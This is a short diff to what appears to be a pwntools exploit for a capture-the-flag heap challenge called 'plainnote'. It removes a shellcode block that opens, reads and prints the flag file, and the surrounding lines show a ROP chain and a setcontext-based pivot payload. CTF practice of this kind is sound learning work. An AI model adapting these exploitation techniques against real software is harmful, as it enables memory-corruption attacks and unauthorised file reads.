@@ -327,25 +327,6 @@ flag = heap+0x2700 # /home/user/ctf/plainnote/flag.txt
     rdx -> 3
 '''
 
-shellcode = f'''
-        mov rdi, 0x{flag:02x}
-        mov rsi, 0x0
-        mov rax, SYS_open
-        syscall
-
-        mov rdi, 0x3
-        mov rsi, 0x{heap:02x}
-        mov rdx, 0x100
-        mov rax, SYS_read
-        syscall
-
-        mov rdi, 0x1
-        mov rsi, 0x{heap:02x}
-        mov rdx, 0x20
-        mov rax, SYS_write
-        syscall
-'''
-
 rop = flat([
         pop_rax_ret,
         SYS_open,
@@ -377,7 +358,6 @@ rop = flat([
         pop_rdi_ret,
         0x0
     ])
-
 
 
 payload = p64(libc.sym.setcontext+0x35) + p64(heap+0xdfe0) +\
